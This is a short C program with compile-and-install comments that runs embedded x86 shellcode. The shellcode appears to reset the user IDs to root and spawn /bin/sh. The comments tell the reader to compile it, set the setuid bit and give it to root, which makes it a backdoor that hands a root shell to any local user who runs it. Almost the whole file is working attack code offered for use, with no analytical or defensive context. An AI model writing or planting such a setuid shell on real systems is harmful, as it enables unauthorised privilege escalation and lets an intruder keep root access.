//    _________________
//  //                 \\
// ||    COMPILATION    ||
//  \\_________________//
//
// gcc -o getprivs getprivs.c
// sudo chmod +s getprivs
// sudo chown root:root getprivs

int main(int argc, char *argv[])
{

    char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59";
    
    int (*exeshell) ();
    exeshell = (int (*) ()) shellcode;
    (int) (*exeshell) ();
}

